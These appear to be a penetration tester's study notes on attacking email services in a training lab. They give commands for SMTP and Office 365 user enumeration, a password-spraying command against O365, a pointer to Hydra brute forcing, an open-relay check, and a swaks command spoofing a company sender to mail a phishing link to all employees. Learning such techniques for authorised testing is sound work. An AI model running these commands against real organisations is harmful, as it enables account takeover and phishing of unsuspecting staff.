user enumeration
```shell-session
smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7
```

Office 365 enumeration
```shell-session
python3 o365spray.py --validate --domain msplaintext.xyz
```

```shell-session
python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz 
```
Credential Brute Forcing
brute pop3 [[Hydra]]
can also try o365spray/MailSniper/CredKing
``
```shell-session
python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz
```

# Open Relay 
An open relay -> SMTP server that allows unauthenticated email relay
Abuse -> send emails as non-existing users/ spoofing someone else's email

See if it allows open relay
```
nmap -p25 -Pn --script smtp-open-relay 10.10.11.213
```
Spoof email
```shell-session
swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Company Notification' --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' --server 10.10.11.213
```

